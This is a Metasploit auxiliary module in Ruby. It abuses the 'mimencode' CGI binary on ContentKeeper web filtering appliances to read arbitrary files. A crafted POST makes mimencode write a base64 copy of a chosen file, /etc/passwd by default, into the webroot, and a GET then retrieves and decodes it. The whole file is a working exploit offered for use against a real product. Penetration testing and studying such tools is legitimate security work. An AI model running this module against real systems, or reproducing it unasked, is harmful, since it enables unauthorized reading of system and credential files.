##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'        => 'ContentKeeper Web Appliance mimencode File Access',
			'Description' => %q{
				This module abuses the 'mimencode' binary present within
				ContentKeeper Web filtering appliances to retrieve arbitrary
				files outside of the webroot.
				},
			'References'   =>
				[
					[ 'OSVDB', '54551' ],
					[ 'URL', 'http://www.aushack.com/200904-contentkeeper.txt' ],
				],
			'Author'      => [ 'patrick' ],
			'License'     => MSF_LICENSE)

		register_options(
			[
				OptString.new('FILE', [ true, 'The file to traverse for', '/etc/passwd']),
				OptString.new('URL', [ true, 'The path to mimencode', '/cgi-bin/ck/mimencode']),
			], self.class)
	end

	def run_host(ip)
		begin
			tmpfile = Rex::Text.rand_text_alphanumeric(20) # Store the base64 encoded traveral data in a hard-to-brute filename, just in case.

			print_status("Attempting to connect to #{rhost}:#{rport}")
			res = send_request_raw(
				{
					'method'  => 'POST',
					'uri'     => normalize_uri(datastore['URL']) + '?-o+' + '/home/httpd/html/' + tmpfile + '+' + datastore['FILE'],
				}, 25)

			if (res and res.code == 500)

				print_status("Request appears successful on #{rhost}:#{rport}! Response: #{res.code}")

				file = send_request_raw(
					{
						'method'  => 'GET',
						'uri'     => '/' + tmpfile,
					}, 25)

				if (file and file.code == 200)
					print_status("Request for #{datastore['FILE']} appears to have worked on #{rhost}:#{rport}! Response: #{file.code}\r\n#{Rex::Text.decode_base64(file.body)}")
				elsif (file and file.code)
					print_error("Attempt returned HTTP error #{res.code} on #{rhost}:#{rport} Response: \r\n#{res.body}")
				end
			elsif (res and res.code)
				print_error("Attempt returned HTTP error #{res.code} on #{rhost}:#{rport} Response: \r\n#{res.body}")
			end

		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
		rescue ::Timeout::Error, ::Errno::EPIPE

		end
	end
end
